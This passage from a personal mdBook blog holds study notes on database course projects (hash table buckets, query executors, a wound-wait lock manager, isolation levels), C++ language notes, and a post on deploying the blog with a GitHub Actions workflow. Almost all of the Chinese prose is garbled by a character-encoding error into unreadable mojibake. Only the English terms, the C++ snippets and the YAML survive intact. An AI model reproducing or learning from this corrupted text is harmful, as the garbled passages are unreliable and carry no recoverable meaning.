<p>å®ç°æ¡¶çš„é¡µç»“æ„æ—¶ï¼Œåœ¨åˆ é™¤ä¸€ä¸ªkey value pairï¼ˆa itemï¼‰çš„æ—¶å€™ï¼ŒåªæŠŠreadableç½®0ï¼Œè®¤ä¸ºå½“readableNum == 0æ—¶ï¼Œä¸€ä¸ªbucketä¸ºç©ºã€‚å½“ä»ä¸€ä¸ªæ¡¶ä¸­åˆ é™¤ä¸€ä¸ªitemï¼Œä¸æ”¹å˜Occupiedï¼Œè€Œè®¾ç½®Readableä¸ºfalseï¼Œå½¢æˆä¸€ä¸ªâ€œtombstoneâ€ã€‚å½“æ¡¶ä¸­æ‰€æœ‰iteméƒ½è¢«æ ‡è®°ä¸ºOccupiedæ—¶ï¼Œåˆ™è®¤ä¸ºæ¡¶æ˜¯æ»¡çš„ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨åˆ†è£‚æ“ä½œï¼Œé‡æ–°åˆ›å»ºä¸¤ä¸ªæ–°çš„æ¡¶ã€‚é¿å…çš„ä¸å¿…è¦çš„åˆ é™¤itemæ“ä½œã€‚</p>
<h3 id="task-3-å¹¶å‘æ§åˆ¶"><a class="header" href="#task-3-å¹¶å‘æ§åˆ¶">Task #3 å¹¶å‘æ§åˆ¶</a></h3>
<p>æ•´ä¸ªhash tableçš„ä¸€ä¸ªå¤§é”table_latch_ï¼Œå’Œæ¯ä¸ªæ¡¶çš„å°é”page latchï¼ˆä»BPMä¸­è·å¾—çš„raw_pageä¸­çš„é”ï¼‰é…åˆä½¿ç”¨ã€‚</p>
<h2 id="project-4-query-execution"><a class="header" href="#project-4-query-execution">Project #4 Query Execution</a></h2>
<p>ä»test/executor/executor_test.cppå‡ºå‘ï¼Œçœ‹çœ‹æ€ä¹ˆä½¿ç”¨planæ¥ç¡®å®šæ‰§è¡Œçš„ï¼Ÿ
æ¯ä¸ªtestæ„å»ºä¸€ä¸ªplanï¼ŒexecutionEnginå®Œæˆå…·ä½“çš„æ‰§è¡Œï¼Œexecutor_factoryæ ¹æ®plançš„ç±»å‹åˆ›å»ºexecutorï¼Œ
executoræ ¹æ®planæ‰§è¡Œã€‚</p>
<p>å…³äºå¦‚ä½•è·å–tableçš„æœ‰å…³ä¿¡æ¯ï¼Ÿ
Catalogä¿å­˜äº†table_oidåˆ°TableInfoçš„æ˜ å°„ï¼ŒtableInfoä¿å­˜äº†ä¸€ä¸ªtableheapå¯¹è±¡ï¼ŒtableHeapä¿å­˜äº†tableçš„å­˜å‚¨é¡µä½ç½®ä¿¡æ¯ï¼Œå¯ç”¨äºå¼€å§‹è·å¾—iteratorçš„èµ·å§‹ä½ç½®</p>
<h3 id="seqscanexecutorçš„å®ç°"><a class="header" href="#seqscanexecutorçš„å®ç°">SeqScanExecutorçš„å®ç°</a></h3>
<p>å¢åŠ æˆå‘˜table_info_ã€itr_ï¼Œæ–¹ä¾¿ä¿å­˜è¿­ä»£ä¿¡æ¯
æ³¨æ„éƒ½è¦ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆæ¥é˜²æ­¢å†…å­˜æ³„æ¼ ä½¿ç”¨unique_ptrç®¡ç†æ–°åˆ›å»ºçš„itr_ï¼Œç”±äºtable_infoæ˜¯ä»catalogä¸­è·å¾—çš„ä¸€ä¸ªæ²¡æœ‰æ‰€æœ‰æƒçš„æŒ‡é’ˆï¼Œä¸ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆç®¡ç†
å¦å¤–å½“planä¸ºnullptrçš„æ—¶å€™è®°å¾—Nextç›´æ¥è¿”å›true
src/catalogä¸­æœ‰table_generatorï¼Œé‡Œé¢ç”Ÿæˆçš„æµ‹è¯•ç”¨tableçš„ schemaä¿¡æ¯</p>
<h3 id="insertexecutor"><a class="header" href="#insertexecutor">InsertExecutor</a></h3>
<p>æ’å…¥tupleåˆ°tableã€æ›´æ–°index
å­¦ä¹ table_generatorä¸­çš„FillTableæ¥è¿›è¡Œæ’å…¥ï¼Œå…ˆæ„é€ <code>vector&lt;Value&gt;</code>çš„tupleå€¼ï¼Œå†æ„é€ tuple
æ›´æ–°indexçš„æ—¶å€™ï¼Œä½¿ç”¨indexæä¾›çš„æ¥å£ï¼ˆinsertEntryï¼‰ï¼Œæ¥å£å†…éƒ¨ä½¿ç”¨çš„æ˜¯ä¹‹å‰å†™å¥½çš„extensible_hash_tableæ¥å®Œæˆçš„
åœ¨catalog_testçš„é‡Œé¢çœ‹ä½¿ç”¨indexçš„æ–¹å¼</p>
<p>å¯¹äºå¤åˆçš„insert executorï¼Œéœ€è¦ä½¿ç”¨child_executorè·å–selectçš„æ‰§è¡Œç»“æœã€‚ç¼–ç æ—¶æ³¨æ„ä½¿ç”¨std::moveæ¥è·å–å³å€¼å¼•ç”¨æ¥åˆå§‹åŒ–unique_ptrã€‚</p>
<h3 id="updateexecutor"><a class="header" href="#updateexecutor">UpdateExecutor</a></h3>
<p>æ›´æ–°indexä½¿ç”¨å…ˆæ ¹æ®Key Deleteï¼Œå†Insertï¼Œåœ¨ç›¸å…³æµ‹è¯•ä¸­å¢åŠ äº†indexæ›´æ–°çš„æ£€æŸ¥ï¼Œæ³¨æ„Indexçš„åˆ›å»ºï¼Œä½¿ç”¨ParseSQLæ¥ç¡®å®šindexçš„ç±»å‹ï¼ˆåˆ—åæ— å…³ç´§è¦ï¼Œå› ä¸ºåé¢çš„key_atträ¼šç¡®å®šå»ºç«‹ç´¢å¼•çš„åˆ—åºå·ï¼‰</p>
<h3 id="deleteexecutor"><a class="header" href="#deleteexecutor">DeleteExecutor</a></h3>
<p>åœ¨æµ‹è¯•çš„æ—¶å€™å‘ç°ScanKeyçš„æ—¶å€™å‘ç°å†™å…¥æ—¶å¤§å°ä¸åŒ¹é…ï¼Œå› ä¸ºextendible_hash_table_indexçš„keyå¤§å°ä¸º8ï¼Œåœ¨generic_key.hä¸­çš„SetFromKeyçš„copyçš„æ—¶å€™ï¼Œæ˜¯æ ¹æ®tupleçš„å¤§å°å†³å®šå¤åˆ¶çš„é•¿åº¦çš„ï¼Œtupleçš„å¤§å°å¯èƒ½è¶…è¿‡key</p>
<pre><code class="language-c++">const Tuple index_key = Tuple(result_set[0]);
</code></pre>
<p>æ”¹ä¸ºæ ¹æ®key_schemaè·å–tupleçš„æ–¹å¼</p>
<pre><code class="language-c++">const Tuple index_key = result_set[0].KeyFromTuple(table_info-&gt;schema_, *index_info-&gt;index_-&gt;GetKeySchema(), index_info-&gt;index_-&gt;GetKeyAttrs()); 
</code></pre>
<h3 id="nested-loop-join"><a class="header" href="#nested-loop-join">Nested Loop Join</a></h3>
<p>å¦‚ä½•æ„é€ tupleï¼Ÿå‘ç°column_value_expressionä¸­æœ‰å¾ˆæ–¹ä¾¿è·å–joinæœ‰å…³schemaçš„åˆ—å€¼çš„æ¥å£ï¼ˆEvaluateJoinï¼‰ï¼Œé‡å†™ConstructTupleã€‚</p>
<h3 id="hash-join"><a class="header" href="#hash-join">Hash Join</a></h3>
<p>æ€ä¹ˆæ ¹æ®å¤šä¸ªkeyæ„å»ºhashï¼Œå‚è€ƒaggregate_executor
åœ¨hash_join_planä¸­å®šä¹‰JoinKeyå’ŒJoinValueï¼Œæå‰å®ä¾‹åŒ–ï¼Œå†åœ¨hash_join_executorä¸­å®šä¹‰hash_table
åœ¨æ„å»ºJoinKeyçš„æ—¶å€™ï¼Œç”±äº plan_-&gt;LeftJoinKeyExpression() åªèƒ½è·å–ä¸€ä¸ªColumnValueExpressionï¼Œæ‰€ä»¥åªèƒ½è·å¾—tupleçš„ä¸€ä¸ªåˆ—ï¼Œå¹¶ä¸èƒ½è·å–å¤šä¸ªå±æ€§çš„å€¼ï¼Œ
è™½ç„¶æˆ‘çš„JoinKeyè®¾è®¡çš„æ—¶å€™æ˜¯æ”¯æŒå¤šä¸ªå±æ€§è¿›è¡Œæ•£åˆ—çš„ã€‚</p>
<h3 id="aggregate"><a class="header" href="#aggregate">Aggregate</a></h3>
<p>Group byçš„å®ç°æ˜¯å¤šä¸ªkeyçš„hashè¡¨ï¼Œå¯¹äºæ²¡æœ‰group_byçš„èšé›†æŸ¥è¯¢ï¼Œè¾“å‡ºç»“æœåªæœ‰ä¸€è¡Œï¼ˆä¸€ä¸ªtupleï¼‰ï¼Œæ‰€ä»¥hashè¡¨ä¸­åªæœ‰ä¸€ä¸ªkey
æ³¨æ„å…³è”å®¹å™¨çš„è¿­ä»£å™¨å¤±æ•ˆçš„é—®é¢˜ï¼Œ
hashè¡¨çš„æ˜ å°„æ˜¯ä»group_byçš„åˆ—å€¼æ˜ å°„åˆ°aggregationçš„value</p>
<h3 id="distinct"><a class="header" href="#distinct">Distinct</a></h3>
<p>å‡ºç°äº†heap_buffer_overflowï¼Œåœ¨MakeDistinctKeyçš„æ—¶å€™,ä¸»è¦æ˜¯column_indexè¶…å‡ºäº†schemaçš„åˆ—æ•°é‡ï¼Œç›´æ¥é€šè¿‡tuple-&gt;GetValueæ¥è·å–
å¦å¤–ï¼Œä¿®æ”¹seq_scan_executorï¼Œè®©è¿”å›çš„tupleç¬¦åˆoutputSchemaæ ¼å¼ï¼ŒåŒæ—¶æ³¨æ„ridçš„è·å–è¦åœ¨origin_tupleä¸­è·å¾—</p>
<h2 id="concurrency-control"><a class="header" href="#concurrency-control">Concurrency Control</a></h2>
<p>é€šè¿‡ä½¿ç”¨ two-phase lock æ¥å®ç°lock_managerã€‚
lock_managerä¸­çš„lock_tableè®°å½•æ¯ä¸ªridå¯¹åº”çš„RequestQueueï¼Œæ¯ä¸ªQueueæœ‰è‡ªå·±çš„é”ï¼Œè®©æƒ³è¦è·å–é”çš„äº‹åŠ¡åœ¨åŒä¸€æŠŠé”ä¸Šç­‰å¾…ï¼Œé…åˆcondition_variableä½¿ç”¨ã€‚</p>
<h3 id="deadlock-prevention"><a class="header" href="#deadlock-prevention">Deadlock prevention</a></h3>
<p>wound wait: è€äº‹åŠ¡è®©å½“å‰æ‹¿ç€é”çš„äº‹åŠ¡rollbackï¼›æ–°äº‹åŠ¡éœ€ç­‰å¾…é”</p>
<p>å¦‚ä½•åˆ¤æ–­è€äº‹åŠ¡ï¼Ÿ
åœ¨transaction_managerçš„beginä¸­ï¼Œä½¿ç”¨å…¨å±€é€’å¢çš„next_txn_idæ¥åˆ›å»ºidï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ¥åˆ¤æ–­äº‹åŠ¡çš„æ–°è€, è€äº‹åŠ¡çš„idæ›´å°</p>
<p>å¦‚ä½•è®©å·²ç»è·å–é”çš„å¹´è½»çº¿ç¨‹abortï¼Ÿ
æ‹¿ç€é”çš„ã€ç­‰å¾…é”çš„å¹´è½»äº‹åŠ¡ï¼Œéƒ½ä¼šè¢«è¯·æ±‚é”çš„è€äº‹åŠ¡abort</p>
<p>å½“è€äº‹åŠ¡è¯·æ±‚é”çš„æ—¶å€™ï¼Œæ£€æŸ¥è¯·æ±‚é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰äº‹åŠ¡ï¼Œå¦‚æœéƒ½æ¯”ä»–å¹´è½»ï¼Œåˆ™notify allï¼Œå¹¶å°†è€äº‹åŠ¡çš„è¯·æ±‚åŠ åˆ°æœ€å‰é¢ï¼Œå¹¶æ¸…ç©ºå…¶ä»–åœ¨ç­‰å¾…çš„request</p>
<p>åœ¨LockRequestä¸­å¢åŠ Transaction *txnæˆå‘˜ï¼Œä¿å­˜æŒ‡é’ˆï¼Œä¾¿äºæ‰¾åˆ°å·²ç»è·å¾—é”çš„äº‹åŠ¡ã€‚
è€äº‹åŠ¡åœ¨WoundWaitè¿‡ç¨‹ä¸­ï¼Œå°†å¹´è½»äº‹åŠ¡çš„çŠ¶æ€è®¾ç½®ä¸ºABORTEDã€‚åœ¨ç­‰å¾…é”çš„å¹´è½»äº‹åŠ¡è¿”å›çš„æ—¶å€™ï¼Œä¼šæ£€æŸ¥è‡ªå·±çš„çŠ¶æ€ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼Œæœ€ç»ˆé‡Šæ”¾è‡ªå·±æ‰€æœ‰çš„é”åœ¨transaction_managerçš„Abortä¸­å®Œæˆ</p>
<h3 id="project-5-concurrent-query-execution"><a class="header" href="#project-5-concurrent-query-execution">Project #5 Concurrent Query Execution</a></h3>
<p>å››ç§éš”ç¦»çº§åˆ«çš„åŒºåˆ«</p>
<ul>
<li>SERIALIZABLE: No phantoms, all reads repeatable, no dirty reads.</li>
<li>REPEATABLE READS: Phantoms may happen.</li>
<li>READ COMMITTED: Phantoms and unrepeatable reads may happen.</li>
<li>READ UNCOMMITTED: All of them may happen.</li>
</ul>
<p>äº‹åŠ¡ç‹¬ç«‹æ€§è¢«ç ´åï¼š</p>
<ol>
<li>unrepeatable read: ä¸€ä¸ªäº‹åŠ¡çš„è¿ç»­ä¸¤ä¸ªreadæ“ä½œè·å–çš„ç»“æœä¸ä¸€æ ·</li>
<li>phantom read: äº‹åŠ¡readçš„ç»“æœå’Œinsertã€deleteæ“ä½œé¡ºåºæœ‰å…³ï¼Œåªé”äº†å½“å‰å­˜åœ¨çš„recordï¼Œè€Œæ²¡æœ‰é”index</li>
<li>dirty read: readçš„ç»“æœä¸å…¶ä»–è¢«å›æ»šçš„äº‹åŠ¡æœ‰å…³</li>
</ol>
<p>å¦‚ä½•å®ç°ï¼š</p>
<ul>
<li>serializable read: è·å–æ‰€æœ‰é”ï¼ŒåŒ…æ‹¬index lockï¼Œstrict two-phase lock</li>
<li>repeatable read: same as above, ä½†æ²¡æœ‰index lock ï¼šæœ¬æ¬¡è¯•éªŒé»˜è®¤è¡Œä¸ºï¼ŒåŒæ—¶å¿½ç•¥index lockçš„ç®¡ç†</li>
<li>read commit: same as above, ä½†ç«‹å³é‡Šæ”¾Shared lockï¼šè¿™ä¸ªåœ¨è¯»queryä¸­å®ç°ï¼Œè·å–åˆ°æ•°æ®åï¼Œç«‹å³è°ƒç”¨Unlock shared</li>
<li>read uncommitted: same as aboveï¼Œä½†ä¸è·å–è¯»é”ï¼šè¿™ä¸ªåœ¨lock managerä¸­å®ç°</li>
</ul>
<p>äº‹åŠ¡ACIDæ€§è´¨ï¼š</p>
<ul>
<li>Atomicity: â€œall or nothingâ€</li>
<li>Consistency: â€œit looks correct to meâ€</li>
<li>Isolation: â€œas if aloneâ€</li>
<li>Durability: â€œsurvive failuresâ€</li>
</ul>
<h2 id="cçŸ¥è¯†è¡¥å……"><a class="header" href="#cçŸ¥è¯†è¡¥å……">C++çŸ¥è¯†è¡¥å……</a></h2>
<h3 id="smart-pointer"><a class="header" href="#smart-pointer">Smart Pointer</a></h3>
<p>å®¹å™¨ä¸­å­˜æ”¾æ™ºèƒ½æŒ‡é’ˆè€Œéå±€éƒ¨å¯¹è±¡</p>
<pre><code class="language-c++">std::vector&lt;std::shared_ptr&lt;BufferPoolManager&gt;&gt; instances_;
</code></pre>
<p>unique_ptrçš„<code>get()</code>æ–¹æ³•è¿”å›è¢«ç®¡ç†å¯¹è±¡çš„æŒ‡é’ˆï¼Œè€Œä¸æ˜¯é‡Šæ”¾æ‰€æœ‰æƒ</p>
<h3 id="å³å€¼å¼•ç”¨"><a class="header" href="#å³å€¼å¼•ç”¨">å³å€¼å¼•ç”¨</a></h3>
<p>ä¸ºäº†å®ç°å¯¹è±¡ç§»åŠ¨è€Œä¸æ˜¯æ‹·è´ï¼Œé¿å…åœ¨æŸäº›æƒ…å†µä¸‹å¯¹è±¡æ‹·è´åå°±è¢«ç«‹å³é”€æ¯äº†ï¼Œç”¨äºæå‡æ€§èƒ½ã€‚</p>
<blockquote>
<p>cpp primer Chapter 13.6
æ ‡å‡†åº“å®¹å™¨ã€stringå’Œshared_ptrç±»æ—¢æ”¯æŒç§»åŠ¨æœ‰æ”¯æŒæ‹·è´ã€‚IOç±»å’Œunique_ptrç±»åªèƒ½ç§»åŠ¨ã€‚</p>
</blockquote>
<pre><code class="language-c++">// åªèƒ½ä½¿ç”¨std::moveä½¿ç”¨ç§»åŠ¨æ„é€ å‡½æ•°åˆå§‹åŒ–left_executor_çš„æˆå‘˜ï¼Œå› ä¸ºleft_executorä¸æ”¯æŒæ‹·è´
NestedLoopJoinExecutor::NestedLoopJoinExecutor(ExecutorContext *exec_ctx, const NestedLoopJoinPlanNode *plan, std::unique_ptr&lt;AbstractExecutor&gt; &amp;&amp;left_executor,std::unique_ptr&lt;AbstractExecutor&gt; &amp;&amp;right_executor)
    : AbstractExecutor(exec_ctx), plan_(plan), left_executor_(std::move(left_executor)), right_executor_(std::move(right_executor)) {}
</code></pre>
<p>ä¸ºäº†æ”¯æŒç§»åŠ¨æ“ä½œï¼Œå¼•å…¥å³å€¼å¼•ç”¨ï¼Œå³å€¼å¼•ç”¨åªèƒ½ç»‘å®šåˆ°ä¸€ä¸ªå³å°†è¢«é”€æ¯çš„å¯¹è±¡ä¸Šã€‚</p>
<p>æ ‡å‡†åº“çš„std::moveå‡½æ•°
æ–¹ä¾¿æ„é€ å‡½æ•°ç¡®å®šä½¿ç”¨é‚£ç§ç±»å‹çš„æ„é€ ï¼ˆç§»åŠ¨æ„é€ è¿˜æ˜¯å¤åˆ¶æ„é€ ï¼‰</p>
<h3 id="vector"><a class="header" href="#vector">vector</a></h3>
<p>vectorçš„reserveï¼Œé¢„ç•™ç©ºé—´ï¼Œä¸æ”¹å˜size</p>
<h3 id="type-cast"><a class="header" href="#type-cast">type cast</a></h3>
<p>å¼ºåˆ¶ç±»å‹è½¬æ¢</p>
<ul>
<li>
<p>static_cast: ä¸å»é™¤å¸¸é‡æ€§å’Œæ˜“å˜æ€§çš„ç±»å‹è½¬æ¢</p>
</li>
<li>
<p>const_cast: æ”¹å˜è¿ç®—å¯¹è±¡çš„åº•å±‚const</p>
<blockquote>
<p>top-level const(é¡¶å±‚const): æŒ‡é’ˆæœ¬èº«æ˜¯ä¸€ä¸ªå¸¸é‡ <br>
low-level const(åº•å±‚const): æŒ‡é’ˆæ‰€æŒ‡å¯¹è±¡æ˜¯ä¸€ä¸ªå¸¸é‡</p>
</blockquote>
</li>
<li>
<p>reinterpret_cast: çº¯ç²¹æ˜¯ä¸€ä¸ªç¼–è¯‘æ—¶æŒ‡ä»¤ï¼ŒæŒ‡ç¤ºç¼–è¯‘å™¨å°† è¡¨è¾¾å¼ è§†ä¸ºå¦‚åŒå…·æœ‰ æ–°ç±»å‹ ç±»å‹ä¸€æ ·å¤„ç†ã€‚</p>
</li>
<li>
<p>dynamic_cast: ç”¨äºè¿è¡Œæ—¶ç±»å‹è¯†åˆ«ï¼Œå°†åŸºç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨å®‰å…¨åœ°è½¬æ¢æˆæ´¾ç”Ÿç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨</p>
</li>
</ul>
<pre><code class="language-c++">template &lt;typename KeyType, typename ValueType, typename KeyComparator&gt;
HashTableDirectoryPage *HASH_TABLE_TYPE::FetchDirectoryPage() {
  return reinterpret_cast&lt;HashTableDirectoryPage*&gt;(buffer_pool_manager_-&gt;FetchPage(directory_page_id_)-&gt;GetData());
}

template &lt;typename KeyType, typename ValueType, typename KeyComparator&gt;
HASH_TABLE_BUCKET_TYPE *HASH_TABLE_TYPE::FetchBucketPage(page_id_t bucket_page_id) {
  return reinterpret_cast&lt;HashTableBucketPage&lt;KeyType, ValueType, KeyComparator&gt; *&gt;(buffer_pool_manager_-&gt;FetchPage(bucket_page_id)-&gt;GetData());
}
</code></pre>
<h3 id="æ¨¡æ¿ç‰¹ä¾‹åŒ–"><a class="header" href="#æ¨¡æ¿ç‰¹ä¾‹åŒ–">æ¨¡æ¿ç‰¹ä¾‹åŒ–</a></h3>
<p>å‚è€ƒ<a href="https://en.cppreference.com/w/cpp/utility/hash">hash</a></p>
<blockquote>
<p>cpp primer Chapter 16.5
å®šä¹‰å‡½æ•°æ¨¡æ¿ç‰¹ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æœ¬è´¨ä¸Šæ¥ç®¡äº†ç¼–è¯‘å™¨çš„å·¥ä½œ...</p>
</blockquote>
<p>å¯ä»¥ä½¿ç”¨ç±»æ¨¡æ¿ç‰¹ä¾‹åŒ–çš„æ–¹å¼å®ç°æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ç±»å‹çš„hashç‰ˆæœ¬ã€‚</p>
<h3 id="è¿­ä»£å™¨å¤±æ•ˆé—®é¢˜"><a class="header" href="#è¿­ä»£å™¨å¤±æ•ˆé—®é¢˜">è¿­ä»£å™¨å¤±æ•ˆé—®é¢˜</a></h3>
<p>cpp primer Chapter 9.3.6
liståˆ é™¤è¿­ä»£å™¨çš„æ—¶å€™ï¼Œå½“å‰è¿­ä»£å™¨å¤±æ•ˆï¼Œä¸èƒ½åœ¨å¾ªç¯åç½®è¯­å¥ä¸­++ï¼Œæœ€å¥½ä¸ç”¨å¾ªç¯çš„æ›´æ”¹ã€‚
ä½†æ˜¯å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼ï¼Œåˆ©ç”¨åç¼€++çš„æ€§è´¨</p>
<pre><code class="language-c++">for (std::list&lt;int&gt;::iterator it = c.begin(); it != c.end();)
{
    if (*it % 2 == 0)
        c.erase(it++);
    else
        ++it;
}
</code></pre>
<p>æˆ–è€…è·å¾—eraseçš„è¿”å›å€¼</p>
<pre><code class="language-c++">for (std::list&lt;int&gt;::iterator it = c.begin(); it != c.end();)
{
    if (*it % 2 == 0)
        it = c.erase(it);
    else
        ++it;
}
</code></pre>
<h3 id="ç±»å‰ç½®å£°æ˜"><a class="header" href="#ç±»å‰ç½®å£°æ˜">ç±»å‰ç½®å£°æ˜</a></h3>
<p>åœ¨transaction.hä¸­å‘ç°äº†ç±»çš„å‰ç½®å£°æ˜ï¼Œè€Œä¸æ˜¯å¼•ç”¨å¤´æ–‡ä»¶ï¼Œå‰ç½®å£°æ˜åªèƒ½ä½œä¸ºæŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œä¸èƒ½å®šä¹‰ç±»çš„å¯¹è±¡ï¼Œè‡ªç„¶ä¹Ÿå°±ä¸èƒ½è°ƒç”¨å¯¹è±¡ä¸­çš„æ–¹æ³•äº†ã€‚</p>
<h3 id="condition-variable"><a class="header" href="#condition-variable">condition variable</a></h3>
<p><code>std::condition_variable</code>åœ¨é”ä¸Šç­‰å¾…Predicate æ»¡è¶³</p>
<p><code>cv.wait(lock, predicate)</code> ç›¸å½“äºï¼š</p>
<pre><code class="language-c++">while (!pred()) {
    wait(lock);
}
</code></pre>
<p>å¦‚æœæ¡ä»¶ä¸æ»¡è¶³ï¼Œåœ¨é”ä¸Šç­‰å¾…å¹¶é‡Šæ”¾é”ï¼Œå½“æ”¶åˆ°notifyä¹‹åï¼Œ(é€šè¿‡ç«äº‰)è·å–é”ï¼Œè¿›è¡Œpredicateåˆ¤æ–­ã€‚å› æ­¤åœ¨è°ƒç”¨waitå‰ï¼Œlockåº”è¯¥æ˜¯å¤„äºä¸Šé”çŠ¶æ€çš„ã€‚
é…åˆRAIIé£æ ¼çš„é”æ¥ä½¿ç”¨ï¼š</p>
<pre><code class="language-c++">{
    std::unique_lock&lt;std::mutex&gt; queue_lk(req_queue.mu_);
    //...
    req_queue.cv_.wait(queue_lk, [&amp;]{
      return txn-&gt;GetState() == TransactionState::ABORTED ||
             req_queue.request_queue_.front().txn_id_ == txn-&gt;GetTransactionId();
    });
}
</code></pre>
<h3 id="lambda"><a class="header" href="#lambda">Lambda</a></h3>
<p>cpp primer 10.3.2
<code>[capture](parameters) -&gt; return_type { body }</code>
æŒ‰å€¼æ•è·ï¼šåœ¨lambdaè¡¨ç¤ºåˆ›å»ºæ—¶è¿›è¡Œæ‹·è´ï¼Œè€Œä¸æ˜¯è°ƒç”¨çš„æ—¶å€™è¿›è¡Œæ‹·è´
å¼•ç”¨æ•è·ï¼šå¿…é¡»ä¿è¯åœ¨lambdaæ‰§è¡Œæ—¶å˜é‡æ˜¯å­˜åœ¨çš„</p>
<p>å¯å˜lambda:å¯¹äºæŒ‰å€¼æ•è·çš„å˜é‡ï¼Œæƒ³è¦æ”¹å˜å®ƒ
<code>auto f = [v1] () mutable { return ++v1; }</code></p>
<h3 id="promise"><a class="header" href="#promise">promise</a></h3>
<p>çº¿ç¨‹é—´åŒæ­¥ï¼Œä¼ é€’å€¼ï¼ˆç”¨futureè¡¨ç¤ºï¼‰
<code>promise&lt;void&gt;</code> åœ¨çº¿ç¨‹é—´å¯¹çŠ¶æ€å‘ä¿¡å·
<code>promise&lt;int&gt;</code> åœ¨çº¿ç¨‹é—´ä¼ é€’ç»“æœã€‚</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="æ„å»ºmdbookçš„åšå®¢"><a class="header" href="#æ„å»ºmdbookçš„åšå®¢">æ„å»ºmdbookçš„åšå®¢</a></h1>
<p>2022/10/28
æˆ‘çš„æ–°åšå®¢ä»è¿™é‡Œå¼€å§‹</p>
<h2 id="motivation-1"><a class="header" href="#motivation-1">Motivation</a></h2>
<p>åŸæ¥çš„åšå®¢bluelogæ”¾åœ¨äº‘æœåŠ¡å™¨ä¸Šï¼Œå¿«åˆ°æœŸäº†ï¼Œä¸æƒ³ç»­è´¹äº†ã€‚
<img src="./images/blog20221028/bluelog_head.png" alt="bluelog" /></p>
<p>bluelogç”¨flaskæ„å»ºï¼Œç»´æŠ¤æˆæœ¬æ¯”è¾ƒé«˜ï¼Œåœ¨çº¿ç¼–è¾‘åšå®¢çš„åŠŸèƒ½è™½ç„¶ä¸é”™ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šç¼ºç‚¹ï¼Œæ¯”å¦‚å®¹æ˜“ä¸¢å¤±å·²ç»åœ¨çº¿ç¼–è¾‘çš„å†…å®¹ï¼Œä»£ç é«˜äº®éœ€è¦æ‰‹åŠ¨ä½¿ç”¨highlight.jsçš„<code>&lt;pre&gt;&lt;code&gt;</code>æ ‡ç­¾ã€‚
<img src="./images/blog20221028/bluelog_edit.png" alt="bluelog_edit" /></p>
<p>ä¸€ç›´æƒ³æ‰¾ä¸€æ¬¾éå¸¸æ–¹ä¾¿çš„åŸºäºmarkdownçš„åšå®¢ï¼Œäºæ˜¯å°±åœ¨çœ‹æ–‡æ¡£çš„æ—¶å€™é€‰æ‹©äº†rustç¼–å†™çš„mdbookã€‚äºæ˜¯æˆ‘å°±æŠŠåŸæ¥çš„<a href="https://github.com/Sugar-Coder/bluelog">bluelog</a>æ‰“åŒ…è¿›docker imageç•™ç€è¿‡å¹´ï¼Œå¼€å§‹éƒ¨ç½²æˆ‘çš„mdbookçš„åšå®¢ã€‚</p>
<h2 id="å®‰è£…mdbook"><a class="header" href="#å®‰è£…mdbook">å®‰è£…mdbook</a></h2>
<p>å‚è€ƒ<a href="https://rust-lang.github.io/mdBook/index.html">mdbook</a>å®˜æ–¹æ–‡æ¡£</p>
<pre><code class="language-shell">$cargo install mdbook
$mdbook init my_mdbook_blog
$mdbook serve --open
$cd my_mdbook_blog
$git init
$git checkout -b mdbook
$git remote add githubpage git@github.com:Sugar-Coder/Sugar-Coder.github.io.git
$git push githubpage mdbook 
</code></pre>
<p>ä»ç„¶ç”¨åŸç«™ç‚¹ä»“åº“ä½œä¸ºè¿œç«¯ä»“åº“</p>
<h2 id="ä½¿ç”¨github-actionæ¥è‡ªåŠ¨åŒ–æ„å»º"><a class="header" href="#ä½¿ç”¨github-actionæ¥è‡ªåŠ¨åŒ–æ„å»º">ä½¿ç”¨github-actionæ¥è‡ªåŠ¨åŒ–æ„å»º</a></h2>
<p>ä½¿ç”¨CI/CDçš„æ–¹å¼æ¥ç®€åŒ–åšå®¢çš„å‘å¸ƒï¼Œåªç”¨å°†æœ¬åœ°çš„æ–°åšå®¢pushåˆ°githubï¼Œå³å¯è‡ªåŠ¨å‘å¸ƒã€‚</p>
<p>è®¾ç½®æˆ‘çš„ä»“åº“çš„default branchä¸ºmdbook</p>
<p><a href="https://github.com/rust-lang/mdBook/wiki/Automated-Deployment%3A-GitHub-Actions">å‚è€ƒ</a>ç¼–å†™<code>.github/workblow/deploy.yml</code></p>
<pre><code class="language-yml">name: Deploy
on:
  push:
    branches:
      - mdbook

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
      with:
        fetch-depth: 0
    - name: Install mdbook
      run: |
        mkdir mdbook
        curl -sSL https://github.com/rust-lang/mdBook/releases/download/v0.4.21/mdbook-v0.4.21-x86_64-unknown-linux-gnu.tar.gz | tar -xz --directory=./mdbook
        echo `pwd`/mdbook &gt;&gt; $GITHUB_PATH
    - name: Deploy GitHub Pages
      run: |
        # This assumes your book is in the root of your repository.
        # Just add a `cd` here if you need to change to another directory.
        mdbook build
        git worktree add gh-pages
        git config user.name &quot;Deploy from CI&quot;
        git config user.email &quot;&quot;
        cd gh-pages
        # Delete the ref to avoid keeping history.
        git update-ref -d refs/heads/gh-pages
        rm -rf *
        mv ../book/* .
        git add .
        git commit -m &quot;Deploy $GITHUB_SHA to gh-pages&quot;
        git push --force --set-upstream origin gh-pages
</code></pre>
